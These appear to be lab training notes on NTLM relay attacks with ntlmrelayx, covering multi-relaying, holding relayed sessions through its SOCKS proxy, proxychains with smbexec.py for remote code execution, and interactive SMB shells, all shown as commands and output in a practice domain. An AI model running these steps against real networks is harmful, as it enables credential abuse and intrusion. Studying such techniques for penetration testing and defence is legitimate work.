
---
### Multi-relaying
`multi-relay` feature of `ntlmrelayx` allows for:

- Identifying the users we receive `NTLM` authentication from (allowing us to decide whether we want to relay their `NTLM` authentication).
- Relaying a single `NTLM` authentication (connection) to multiple targets.
`Multi-relaying` is the default behavior for the HTTP and SMB servers of `ntlmrelayx`; however, to deactivate it, we can use the `--no-multirelay` option, making it relay the connection(s) only once (i.e., one incoming connection maps to only one attack).

| **Target Type**         | **Example**                          | **Multi-relaying Default Status** |
| :---------------------- | :----------------------------------- | :-------------------------------- |
| `Single General Target` | `-t TargetIp`                        | `Disabled`                        |
| `Single Named Target`   | `-t smb://DomainName\\User@TargetIp` | `Enabled`                         |
| `Multiple Targets`      | `-tf relayTargets.txt`               | `Enabled`                         |
#### Examples
```bash
ntlmrelayx.py -t smb://[TargetIp]
```
This relationship is `1:1`, as `one` connection maps to only `one` attack (an edge case is whereby `ntlmrelayx` receives two different connections at the same time; although `multi-relay` will be disabled, `ntlmrelayx` incorrectly relays the two connections instead of rejecting either of them).
```bash
ntlmrelayx.py -t smb://Domainname\\User@TargetIp
```
This relationship is `M:M`, as `many` connections map to `many` attacks.
### SOCKs Connections
Whenever `ntlmrelayx` starts, it launches a SOCKS proxy that we can use to hold relayed authenticated sessions and keep them active, allowing us to abuse them with any tool.
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra  
<SNIP>

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
```
The `-socks` options enable a command-line interface within `ntlmrelayx`, you can continue typing interactive commands even if the debug messages keep printing.
```bash
ntlmrelayx> help

Documented commands (type help <topic>):
========================================
help  socks

Undocumented commands:
======================
EOF  exit  finished_attacks  startservers  stopservers  targets
```
The `socks` interactive command lists the active sessions:
```bash
ntlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.50  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445  
SMB       172.16.117.50  INLANEFREIGHT/NPORTS  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/NPORTS  FALSE        445
```
The option `-socks` makes `ntlmrelayx` act as a proxy, meaning that we can combine it with `proxychains` to use the sessions it holds.

`ntlmrelayx`'s default proxy port is `1080`, so we have to set `etc/proxychains4.conf`.
```bash
hcx05@htb[/htb]$ cat /etc/proxychains4.conf | grep socks4

#       proxy types: http, socks4, socks5
socks4  127.0.0.1 1080
```
Use the administrative authenticated session of `INLANEFREIGHT/PETER` to get remote code execution by using `smbexec.py`.
```bash
proxychains4 -q smbexec.py INLANEFREIGHT/PETER@[Target_Ip] -no-pass
```
We will use the `-no-pass` option to prevent `smbexec.py` from prompting us for a password because we will abuse the authenticated session established held by `ntlmrelayx`'s SOCKS proxy.

**Note**: We need to keep `ntlmrelayx` running to utilize the authenticated sessions available on the SOCKs server, otherwise if we close it, its SOCKS server also closes.

If we don't have admin permissions, we'll use `smbclient.py` to list share folder.
```bash
proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@[Target_Ip] -no-pass
```
```bash
hcx05@htb[/htb]$ proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares

ADMIN$
C$
Finance
IPC$
# use Finance
# ls
drw-rw-rw-          0  Mon Jul 31 13:25:51 2023 .
drw-rw-rw-          0  Mon Jul 31 13:25:51 2023 ..
-rw-rw-rw-         18  Mon Jul 17 20:07:49 2023 flag.txt
-rw-rw-rw-         22  Mon Jul 17 20:07:49 2023 report.txt
# exit
```
### Interactive SMB Client Shells
`--interactive`/`-i` option to launch an SMB client shell for each `ntlmrelayx` established authenticated session. The SMB client shell will listen locally on a TCP port, and we can reach it with tools such as `nc`.
#### Using the Interactive Option
```bash
hcx05@htb[/htb]$ ntlmrelayx.py -tf relayTargets.txt -smb2support -i

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/NPORTS SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11002
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11003
<SNIP>
```
`ntlmrelayx` started interactive SMB client shells for each authenticated session on the relay targets; Each connection will open a port to the target machine.
#### Interactive Shell
```bash
hcx05@htb[/htb]$ nc -nv 127.0.0.1 11000

Connection to 127.0.0.1 11000 port [tcp/*] succeeded!
Type help for list of commands
# shares

ADMIN$
C$
Finance
IPC$
```















































